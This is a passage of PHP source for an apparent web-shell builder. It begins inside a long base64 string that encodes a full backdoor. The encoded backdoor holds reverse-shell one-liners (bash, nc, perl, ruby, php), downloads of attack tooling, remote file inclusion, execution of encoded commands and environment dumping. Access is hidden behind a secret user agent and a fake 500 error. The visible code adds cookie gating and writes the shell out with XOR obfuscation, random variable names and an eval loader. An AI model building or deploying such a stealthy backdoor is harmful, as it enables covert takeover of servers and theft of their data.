eHBsb2l0ZXIvU1VJRDNOVU0vbWFzdGVyL3N1aWQzbnVtLnB5IgogICAgKTsKICAgICR3aW5kZWZhdWx0ID0gJHJlcG9zWydXaW5CQVQnXTsKICAgICRsaW5EZWZhdWx0ID0gJHJlcG9bJ2xpbnV4J107CiAgICBpZiAoIWVtcHR5KCRyZXBvKSkgewogICAgICAgIGVjaG8oIjxzcGFuIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOndoaXRlJz5HaXQgaXMgb2ssIGV4ZWN1dGluZyBwdWxsIHJlcXVlc3Qgb24gIiAuICRyZXBvIC4gIjwvc3Bhbj4iKTsKICAgICAgICBzaGVsbF9leGVjKCJnaXQgY2xvbmUgIiAuICRyZXBvKSB8fCBkaWUoIkNvdWxkIG5vdCBwdWxsIGZyb20gdGhlIHJlcG8uLiBzb21ldGhpbmcgaXMgd3Jvbmcgd2l0aCBnaXQgaXRzZWxmLCB0cnkgdG8gdXNlIGFsdGVybmF0aXZlIG1ldGhvZHMuIik7CiAgICAgICAgZWNobygiQ2xvbmVkIFJlcG86IFxuIiAuIHNoZWxsX2V4ZWMoImxzIC1sYWgiKSk7CiAgICB9IGVsc2VpZiAoJG9zID09ICJsaW4iKSB7CiAgICAgICAgZWNobygiTGludXggc2VsZWN0ZWQiKTsKICAgICAgICBzaGVsbF9leGVjKCJjdXJsICIgLiAkbGluRGVmYXVsdCAuICItbyBsaW4uc2ggJiYgY2htb2QgK3ggLi9saW4uc2giKTsKICAgIH0gZWxzZWlmICgkb3MgPT0gIndpbiIpIHsKICAgICAgICBlY2hvKCJXaW4gZGVmYXVsdCBzZWxlY3RlZC4iKTsKICAgICAgICBzaGVsbF9leGVjKCJjdXJsLmV4ZSAtLW91dHB1dCB3aW5iYXQuYmF0ICIgLiAkd2luZGVmYXVsdCk7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8oImFzc3VtaW5nIGxpbnV4LCBzaW5jZSBpdCB3YXMgbm90IHNwZWNpZmllZC4iKTsKICAgICAgICBzaGVsbF9leGVjKCJjdXJsICIgLiAkcmVwb3NbImRlZmF1bHQiXSAuICIgLW8gc3VpZC5weSAmJiBjaG1vZCAreCBzdWlkLnB5Iik7CiAgICB9Cn0KCmZ1bmN0aW9uIGNoZWNrU3lzdGVtKCkKewogICAgJG9zID0gYXJyYXkoKTsKICAgIGlmIChzdWJzdHIocGhwX3VuYW1lKCksIDAsIDcpID09ICdXaW5kb3dzJykgewogICAgICAgIGFycmF5X3B1c2goJG9zLCAiV2luZG93cyIpOwogICAgICAgIHdpbmRvd3MoImJoIiwgImRsIik7CiAgICAgICAgd2luZG93cygiYXpoIiwgImRsIik7CiAgICAgICAgd2luZG93cygiYmhlIiwgImRsIik7CiAgICAgICAgd2luZG93cygibmNXIiwgImRsIik7CiAgICAgICAgcmV0dXJuICRvczsKICAgIH0gZWxzZSB7CiAgICAgICAgYXJyYXlfcHVzaCgkb3MsIkxpbnV4Iik7CiAgICAgICAgcmV0dXJuICRvczsKICAgIH0KfQoKZnVuY3Rpb24gc2hvd0Vudigkb3MpCnsKICAgIGlmICghZW1wdHkoJG9zKSkgewogICAgICAgIGlmICgkb3NbMF0gPT0gJ0xpbnV4JykgewogICAgICAgICAgICBlY2hvKHNoZWxsX2V4ZWMoJ2VudicpKTsKICAgICAgICB9IGVsc2VpZiAoJG9zID09ICJXaW5kb3dzIikgewogICAgICAgICAgICBlY2hvKHNoZWxsX2V4ZWMoIlNFVCIpKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gbnVsbDsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gbnVsbDsKfQoKZnVuY3Rpb24gcmV2ZXJzZUNvbm5lY3Rpb25zKCRtZXRob2RzLCAkaG9zdCwgJHBvcnQsICRzaGVsbCkKewogICAgb2Jfc3RhcnQoKTsKICAgICRkZWZhdWx0UG9ydCA9IDE2MzQ7CiAgICAkZGVmYXVsdEhvc3QgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsKICAgICRkZWZhdWx0U2hlbGwgPSBzaGVsbF9leGVjKCJ3aGljaCBiYXNoIik7CgogICAgJHVzZUhvc3QgPSBudWxsOwogICAgJHVzZVBvcnQgPSBudWxsOwogICAgJHVzZVNoZWxsID0gbnVsbDsKCiAgICBpZiAoZW1wdHkoJGhvc3QpKSB7CiAgICAgICAgZWNobygiXG5Ib3N0IHdhcyBlbXB0eSwgdXNpbmc6ICIgLiAkZGVmYXVsdEhvc3QgLiAiXG4iKTsKICAgICAgICAkdXNlSG9zdCA9ICRkZWZhdWx0SG9zdDsKICAgIH0gZWxzZSB7CiAgICAgICAgJHVzZUhvc3QgPSAkaG9zdDsKICAgIH0KICAgIGlmIChlbXB0eSgkc2hlbGwpKSB7CiAgICAgICAgZWNobygiXG5TaGVsbCB3YXMgZW1wdHksIHVzaW5nIGRlZmF1bHQ6ICIgLiAkZGVmYXVsdFNoZWxsIC4gIlxuIik7CiAgICAgICAgJHVzZVNoZWxsID0gJGRlZmF1bHRTaGVsbDsKICAgIH0gZWxzZSB7CiAgICAgICAgJHVzZVNoZWxsID0gJHNoZWxsOwogICAgfQogICAgaWYgKGVtcHR5KCRwb3J0KSkgewogICAgICAgIGVjaG8oIlxuUG9ydCB3YXMgZW1wdHksIHVzaW5nIGRlZmF1bHQ6ICIgLiAkZGVmYXVsdFBvcnQgLiAiXG4iKTsKICAgICAgICAkdXNlUG9ydCA9ICRkZWZhdWx0UG9ydDsKICAgIH0gZWxzZSB7CiAgICAgICAgJHVzZVBvcnQgPSAkcG9ydDsKICAgIH0KICAgICRjb21tYSA9IGFycmF5KAogICAgICAgICJiYXNoIiA9PiAiYmFzaCAtaSA+JiAvZGV2L3RjcC97JHVzZUhvc3R9LyIgLiAkdXNlUG9ydCAuICIgMD4mMSIsCiAgICAgICAgInBocCIgPT4gInBocCAtciAnXCRzb2NrPWZzb2Nrb3BlbihcIiIgLiAkdXNlSG9zdCAuICJcIiwiIC4gJHVzZVBvcnQgLiAiKTtleGVjKFwiJHVzZVNoZWxsIC1pIDwmMyA+JjMgMj4mM1wiKTsnIiwKICAgICAgICAibmMiID0+ICJuYyAtZSAiIC4gJHVzZVNoZWxsIC4gIiBcIiIgLiAkdXNlSG9zdCAuICJcIiAiIC4gJHVzZVBvcnQuICJcIiIsCiAgICAgICAgIm5jUyIgPT4gInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5vaHVwIG5jIFwiIiAuICR1c2VIb3N0IC4gIlwiICIgLiAkdXNlUG9ydCAuICIgPi90bXAvZiIsCiAgICAgICAgInJ1YnkiID0+ICJydWJ5IC1yc29ja2V0IC1lJ2Y9VENQU29ja2V0Lm9wZW4oXCIiIC4gJHVzZUhvc3QgLiAiXCIsIiAuICR1c2VQb3J0IC4gIikudG9faTtleGVjIHNwcmludGYoXCIkdXNlU2hlbGwgLWkgPCYlZCA+JiVkIDI+JiVkXCIsZixmLGYpJyIsCiAgICAgICAgInBlcmwiID0+ICJwZXJsIC1lICd1c2UgU29ja2V0O1wkaT1cIiIgLiAkdXNlSG9zdCAuICJcIjtcJHA9IiAuICR1c2VQb3J0IC4gIjtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKFwidGNwXCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oXCRwLGluZXRfYXRvbihcJGkpKSkpe29wZW4oU1RESU4sXCI+JlNcIik7b3BlbihTVERPVVQsXCI+JlNcIik7b3BlbihTVERFUlIsXCI+JlNcIik7ZXhlYyhcIiR1c2VTaGVsbCAtaVwiKTt9OyciLAogICAgKTsKICAgICRkZWZhdWx0QWN0aW9uID0gJGNvbW1hWyJiYXNoIl07CiAgICBpZiAoIWVtcHR5KCRtZXRob2RzKSkgewogICAgICAgIGVjaG8oIlxuQXR0ZW1wdGluZyB0byBjb25uZWN0IGJhY2ssIGVuc3VyZSB5b3UgaGF2ZSB0aGUgbGlzdGVuZXIgcnVubmluZy5cbiIpOwogICAgICAgIGVjaG8oIlxuVXNpbmc6ICIgLiAkbWV0aG9kcyAuICJcblJob3N0OiAiIC4gJHVzZUhvc3QgLiAiXG5ScG9ydDogIiAuICR1c2VQb3J0IC4gIlxuTHNoZWxsOiAiIC4gJHVzZVNoZWxsIC4gIlxuIik7CgogICAgICAgIHBhc3N0aHJ1KCRjb21tYVskbWV0aG9kc10pOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvKCJcbllvdSBkaWRudCBzcGVjaWZ5IGEgbWV0aG9kIHRvIHVzZSwgZGVmYXVsdGluZyB0byBiYXNoLlxuIik7CiAgICAgICAgZWNobygiXG5SaG9zdDogIiAuICR1c2VIb3N0IC4gIlxuUnBvcnQ6ICIgLiAkdXNlUG9ydCAuICJcbkxzaGVsbDogIiAuICR1c2VTaGVsbCAuICJcbiIpOwogICAgICAgIHBhc3N0aHJ1KCRkZWZhdWx0QWN0aW9uKTsKICAgIH0KICAgICR2YXIgPSBvYl9nZXRfY29udGVudHMoKTsKICAgIG9iX2VuZF9jbGVhbigpOwogICAgb2JfZW5kX2ZsdXNoKCk7Cn0KCmZ1bmN0aW9uIGV4ZWN1dGVDb21tYW5kcyhzdHJpbmcgJGNvbSwgaW50ICRydW4pCnsKICAgIGlmICghZW1wdHkoJGNvbSkgJiYgJHJ1biA9PT0gIjEiKSB7CiAgICAgICAgZWNobygifiBJbmZvIFRvIFJlbWVtYmVyIH4gXG4iIC4gc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCRjb20pKSk7CiAgICB9ZWxzZXsKICAgICAgICBlY2hvKCJcbkV4ZWN1dGluZzogIi4gJGNvbSAuIlxuLT4iLiBzaGVsbF9leGVjKGJhc2U2NF9kZWNvZGUoJGNvbSkpKTsKICAgIH0KfQoKZnVuY3Rpb24gcmVtb3RlRmlsZUluY2x1ZGUoc3RyaW5nICR0YXJnZXRGaWxlKQp7CiAgICBpZiAoIWVtcHR5KCR0YXJnZXRGaWxlKSkgewogICAgICAgIGluY2x1ZGUgKGJhc2U2NF9kZWNvZGUoJHRhcmdldEZpbGUpKSBvciBkaWUoIkNvdWxkIG5vdCByZW1vdGUgaW1wb3J0IDooXG4iKTsKICAgIH0KfQoKZnVuY3Rpb24gd2luZG93cygkY29tLCAkcil7CiAgICBpZiAoIWVtcHR5KCRjb20pICYmICFlbXB0eSgkcikpewogICAgICAgICRjZGlyID0gZGlybmFtZSgiLiIgLiAiXFwiIC5QSFBfRU9MKTsKICAgICAgICBpZiAoJHIgPT0gImRsIikgewogICAgICAgICAgICBlY2hvKCJcblRoaXMgaXMgcXVpdGUgbm9pc3ksIHlvdSBzaG91bGQgbWFrZSBhIGhpZGRlbiBkaXJlY3RvcnkgaW4gb3JkZXIgdG8gaGlkZSB0aGVzZS4uXG4iKTsKICAgICAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRjb20pKSB7CiAgICAgICAgICAgICAgICBjYXNlICJiaCI6CiAgICAgICAgICAgICAgICAgICAgZWNobygiUHVsbGluZyBTaGFycEhvdW5kLi5cbiIpOwogICAgICAgICAgICAgICAgICAgIHNoZWxsX2V4ZWMoIkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL21hc3Rlci9Db2xsZWN0b3JzL1NoYXJwSG91bmQucHMxIC1PdXRGaWxlIGFmLnBzMSIpOwogICAgICAgICAgICAgICAgICAgIGVjaG8oIlxuRmlsZSBkb3dubG9hZGVkIHRvOiAiLiAkY2RpciAuICIgYWYucHMxIik7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlICJhemgiOgogICAgICAgICAgICAgICAgICAgIGVjaG8oIlB1bGxpbmcgQXp1cmVob3VuZC4uLlxuIik7CiAgICAgICAgICAgICAgICAgICAgc2hlbGxfZXhlYygiSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQmxvb2RIb3VuZEFEL0Jsb29kSG91bmQvbWFzdGVyL0NvbGxlY3RvcnMvQXp1cmVIb3VuZC5wczEgLU91dEZpbGUgYWYxLnBzMSIpOwogICAgICAgICAgICAgICAgICAgIGVjaG8oIlxuRmlsZSBkb3dubG9hZGVkIHRvOiAiLiAkY2RpciAuICIgYWYxLnBzMSIpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAiYmhlIjoKICAgICAgICAgICAgICAgICAgICBlY2hvKCJQdWxsaW5nIEJsb29kaG91bmQgRXhlY3V0YWJsZSFcbiIpOwogICAgICAgICAgICAgICAgICAgIHNoZWxsX2V4ZWMoIkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL21hc3Rlci9Db2xsZWN0b3JzL1NoYXJwSG91bmQuZXhlP3Jhdz10cnVlIC1PdXRGaWxlIGFmMi5leGUiKTsKICAgICAgICAgICAgICAgICAgICBlY2hvKCJcbkZpbGUgZG93bmxvYWRlZCB0bzogIi4gJGNkaXIgLiAiIGFmMi5wczEiKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgIm5jVyI6CiAgICAgICAgICAgICAgICAgICAgZWNobygiUHVsbGluZyBOY2F0IEV4ZWN1dGFibGUhXG4iKTsKICAgICAgICAgICAgICAgICAgICBzaGVsbF9leGVjKCJJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly9ubWFwLm9yZy9kaXN0L25jYXQtcG9ydGFibGUtNS41OUJFVEExLnppcCAtT3V0RmlsZSBuYzEuemlwIik7CiAgICAgICAgICAgICAgICAgICAgc2hlbGxfZXhlYygiRXhwYW5kLUFyY2hpdmUgbmNhdC1wb3J0YWJsZS01LjU5QkVUQTEuemlwICRjZGlyIik7CiAgICAgICAgICAgICAgICAgICAgZWNobygiXG5GaWxlIGV4cGFuZGVkIHRvOiAiLiAkY2Rpcik7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgZWNobyAoIkZ1dHVyZSB2ZXJzaW9ucyB3aWxsIGhhdmUgYW4gZXhlY3V0aW9uIHBoYXNlLiIpOwoKICAgICAgICB9CiAgICB9Cn0KCmlmICgkX1NFUlZFUlsiUkVRVUVTVF9NRVRIT0QiXSA9PSAiUE9TVCIgJiYgJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddID09PSAnc3AxLjEnKSB7CiAgICBiYW5uZXIoKTsKICAgIGlmICghaXNzZXQoJENIRUNLX0lOX0hPU1QpKSB7CiAgICAgICAJZGVmaW5lKCJDSEVDS19JTl9IT1NUIiwgJF9TRVJWRVJbIlJFTU9URV9BRERSIl0pOwogICAgfQogICAgc2V0Y29va2llKCJUZXN0MSIsICIxIik7CiAgICBzZXRjb29raWUoImNoZWNrSW4iLCAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXSk7CiAgICBoZWFkZXIoIkFjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbjogKiIpOwogICAgaGVhZGVyKCJBY2Nlc3MtQ29udHJvbC1BbGxvdy1DcmVkZW50aWFsczogdHJ1ZSIpOwogICAgaWYgKCFlbXB0eSgkX1BPU1RbInQiXSkpIHsKICAgICAgICBpZiAoJF9QT1NUWyd0J10gPT09ICJlIil7CiAgICAgICAgICAgICRuID0gc29kaXVtX2NyeXB0b19hZWFkX3hjaGFjaGEyMHBvbHkxMzA1X2lldGZfZGVjcnlwdChiYXNlNjRfZGVjb2RlKCRfUE9TVFsnbmUnXSkgLCBiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYWQnXSkgLCBiYXNlNjRfZGVjb2RlKCRfUE9TVFsnayddKSAsIGJhc2U2NF9kZWNvZGUoJF9QT1NUWydjJ10pKTsKICAgICAgICAgICAgZXhlY3V0ZUNvbW1hbmRzKCRuLCAiMCIpOwogICAgICAgIH1lbHNlewogICAgICAgICAgICBleGVjdXRlQ29tbWFuZHMoYmFzZTY0X2RlY29kZSgkX1BPU1RbImNyIl0pLCAiMCIpOwogICAgICAgIH0KICAgIH0gZWxzZWlmICghZW1wdHkoJF9QT1NUWyJjbG9uZSJdKSkgewogICAgICAgIGlmICghZW1wdHkoJF9QT1NUWyJST1MiXSkpIHsKICAgICAgICAgICAgJFJPUyA9IGh0bWxlbnRpdGllcygkX1BPU1RbIlJPUyJdKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkUk9TID0gIiI7CiAgICAgICAgfQogICAgICAgIGNsb25lcigkX1BPU1RbImNsb25lIl0sICRST1MpOwogICAgfSBlbHNlaWYgKCFlbXB0eSgkX1BPU1RbImRvSW5jbHVkZSJdKSkgewogICAgICAgIHJlbW90ZUZpbGVJbmNsdWRlKCRfUE9TVFsiZG9JbmNsdWRlIl0pOwogICAgfSBlbHNlaWYgKCFlbXB0eSgkX1BPU1RbImI2Il0pKSB7CiAgICAgICAgZWNobygiRnV0dXJlIGVkaXRpb25zIHdpbGwgaGF2ZSB0aGlzLlxuIik7CiAgICAgICAgLy9iNjQoKTsKICAgIH0gZWxzZWlmICgkX1BPU1RbInJjb20iXSkgewogICAgICAgIHJldmVyc2VDb25uZWN0aW9ucyhodG1sZW50aXRpZXMoJF9QT1NUWyJtdGhkIl0pLCBodG1sZW50aXRpZXMoJF9QT1NUWyJob3N0Il0pLCBodG1sZW50aXRpZXMoJF9QT1NUWyJwb3J0Il0pLCBodG1sZW50aXRpZXMoJF9QT1NUWyJzaGVsbCJdKSk7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8oIkVtcHR5IHBvc3QiKTsKICAgIH0KfSBlbHNlaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09ICJHRVQiICYmICRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSA9PT0gJ3NwMS4xJykgewogICAgYmFubmVyKCk7CiAgICBzZXRjb29raWUoImNoZWNrSW4iLCAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSk7CiAgICBoZWFkZXIoIkFjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbjogKiIpOwogICAgaGVhZGVyKCJBY2Nlc3MtQ29udHJvbC1BbGxvdy1DcmVkZW50aWFsczogdHJ1ZSIpOwogICAgaWYgKCFlbXB0eSgkX0dFVFsicXMiXSkpIHsKICAgICAgICBpZiAoJF9HRVRbInFzIl0gPT0gImNxUyIpCiAgICAgICAgICAgIHNob3dFbnYoY2hlY2tTeXN0ZW0oKSk7CiAgICAgICAgZWxzZWlmICgkX0dFVFsicXMiXSA9PSAiY3FQIikKICAgICAgICAgICAgY2hlY2tQYWNrKCk7CiAgICAgICAgZWxzZWlmICgkX0dFVFsicXMiXSA9PSAiY3FQUiIpCiAgICAgICAgICAgIHBhcnNlUHJvdGVjdGlvbnMoKTsKICAgICAgICBlbHNlaWYgKCRfR0VUWyJxcyJdID09ICJjcVNIIikKICAgICAgICAgICAgY2hlY2tTaGVsbHMoKTsKICAgICAgICBlbHNlaWYgKCRfR0VUWyJxcyJdID09ICJjcUNNIikKICAgICAgICAgICAgY2hlY2tDb21zKCk7CiAgICAgICAgZWxzZWlmICgkX0dFVFsicXMiXSA9PSAiY3FCUyIpCiAgICAgICAgICAgIGV4ZWN1dGVDb21tYW5kcyhiYXNlLCAiMSIpOwogICAgfSBlbHNlIHsKICAgICAgICBpZiAoIWVtcHR5KCRDSEVDS19JTl9IT1NUKSkgewogICAgICAgICAgICBoZWFkZXIoIkNoZWNraW46ICIgLiAkQ0hFQ0tfSU5fSE9TVCk7CiAgICAgICAgfQogICAgICAgICRyaG9zdCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddOwogICAgICAgIGh0dHBfcmVzcG9uc2VfY29kZSg1MDApOwogICAgICAgIGhlYWRlcigiU3RhdHVzOiA1MDAgSW50ZXJuYWwgU2VydmVyIEVycm9yIik7CiAgICAgICAgZGVuaWVkKCRyaG9zdCk7CiAgICB9Cn0gZWxzZSB7CiAgICAkcmhvc3QgPSAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTsKICAgIGhlYWRlcigiU3RhdHVzOiA1MDAgSW50ZXJuYWwgU2VydmVyIEVycm9yIik7CiAgICBodHRwX3Jlc3BvbnNlX2NvZGUoNTAwKTsKICAgIGRlbmllZCgkcmhvc3QpOwp9Cgo=\"";
            }
            $cName = trim(readline("[ !! ] Need to set a cookie name, if this field is left blank it will be randomly generated. [ !! ]\n->"));
            $cValue = trim(readline("[ !! ] Need a unique value that the cookie will need to be set to in order for the shell to accept communication from the client\nIf blank it will be randomized. [ !! ]\n->"));
            if (empty($cName)){
                $cName = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
            }
            if (empty($cValue)){
                $cValue = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 10)));
            }
            $la[240] = $checkInHost;
            $la[241] = $checkInPort;
            $la[242] = $checkInDuration;
            $la[246] = "\$ESP=\"if (\$_COOKIE['$cName'] === '{$cValue}')\nunserialize(base64_decode(sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode(\$v[3]), hex2bin(\$v[2]), hex2bin(\$v[0]), hex2bin(\$v[1]))), ['allowed_classes' => false])";
            foreach ($la as $letter) {
                foreach (str_split($letter) as $word) {
                    array_push($b_encoded, $char_map_lower[strtolower($word)]);
                }
            }
            switch (strtolower($mode)) {
                case "n":
                    $d = "<?php\neval(base64_decode(\"" . base64_encode(implode("", $b_encoded)) . "\"));\n";
                    fputs(fopen($out, "w"), $d, strlen($d));
                    return array(
                        "Hmac Algo" => null,
                        "Cipher Algo" => null,
                        "CipherText" => null,
                        "Key" => null,
                        "IV" => null,
                        "tag" => null,
                        "XOR Key" => null,
                        "Output File" => $out,
                        "CheckinDomain" => $checkInHost,
                        "CheckinPort" => $checkInPort,
                        "WhenToPanic" => $checkInDuration,
                        "Depth" => 0,
                        "Cookie" => null,
                        "Cookie Value" => null
                    );
                case "ob":
                    $out_file = fopen($out, "w");
                    $xorkey = bin2hex(random_bytes(rand(128, 256)));
                    fputs($out_file, "<?php\n", strlen("<?php\n"));
                    for ($i = 0; $i <= $depth; $i++) {
                        $ax = $this->randomString();
                        fputs($out_file, $ax, strlen($ax));
                    }
                    $returned = $this->randomString();
                    fputs($out_file, $returned, strlen($returned));
                    $i = 0;
                    $encrypted = '';
                    $text = base64_encode(implode("", $b_encoded));
                    foreach (str_split($text) as $char) {
                        $encrypted .= chr(ord($char) ^ ord($xorkey{$i++ % strlen($xorkey)}));
                    }
                    $b = base64_encode($encrypted);
                    $fun = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
                    $ad = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
                    $da = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
                    $f_name = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
                    $values = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
                    $chars = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
                    $iterator = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
                    $tt = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
                    $tt_name = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5)));
                    if (!is_null($xorkey)) {
                        $a = "\$" . $f_name . " = \"" . (string)$xorkey . "\";";
                    }
                    $do = <<<FULL
function $fun(string \$$values)
{
    $a
    \$$iterator = 0;
    if (!empty(\$$values)){
        \$$ad = \$$values;
        foreach (str_split(\$$ad) as \$$chars){
            \$$da .= chr(ord(\$$f_name{\$$iterator++ % strlen(\$$f_name)}) ^ ord(\$$chars));
        }
    }
    \$$tt = tempnam(sys_get_temp_dir(),"$tt_name");
    fwrite(fopen(\$$tt, "a+"), base64_decode(\$$da));
    if (substr(php_uname(), 0, 7) == 'Windows') {
        system("start /b php -F \$$tt");
    }else{
        pcntl_fork();
        passthru("php -F \$$tt");
    }
}
$fun(base64_decode("$b"));
FULL;
                    fputs($out_file, $do, strlen($do));
                    fclose($out_file);
                    echo "\n\nThere is an error, being caused for unknown reasons. This routine is now for some reason adding random numbers into variable names, which, causes the variables to break.\nplease manually verify that this did not just randomly throw in a number somewhere. FOR GOD ONLY KNOWS WHAT REASON.\nI have looked over the code for hours to try to find out why, and i cannot for the life of me figure out why. this is a bug, and will be fixed asap.\n\n";
                    return array(
                        "Hmac Algo" => "sha512",
                        "Cipher Algo" => $eXC['Algo'],
                        "CipherText" => base64_encode($eXC['CT']),
                        "Key" => base64_encode($eXC['key']),
                        "IV" => base64_encode($eXC['IV']),
                        "tag" => base64_encode($eXC['Tag']),
                        "XOR Key" => $xorkey,
                        "Output File" => $out,
                        "CheckinDomain" => $checkInHost,
                        "CheckinPort" => $checkInPort,
                        "WhenToPanic" => $checkInDuration,
                        "Depth" => $depth,
                        "Cookie" => $cName,
                        "Cookie Value" => $cValue
                    );
            }
        } else {
            $required_params = array();
            if (empty($mode)) {
                array_push($required_params, ("mode cannot be empty. Please use either ob for obfuscation or n for plain."));
            } else if (empty($file)) {
                array_push($required_params, "file cannot be empty.");
            } else if (!is_file($file)) {
                array_push($required_params, "File needs to be of type file not string.(think fopen)");
            }
            throw new Exception("Please rectify the following errors: \n" . print_r($required_params) . "\n");
        }
        return array(
            "Hmac Algo" => null,
            "Cipher Algo" => null,
            "CipherText" => null,
            "Key" => null,
            "IV" => null,
            "tag" => null,
            "XOR Key" => null,
            "Output File" => null,
            "CheckinDomain" => null,
            "CheckinPort" => null,
            "WhenToPanic" => null,
            "Depth" => 0,
            "Cookie" => null,
            "Cookie Value" => null
        );
    }


}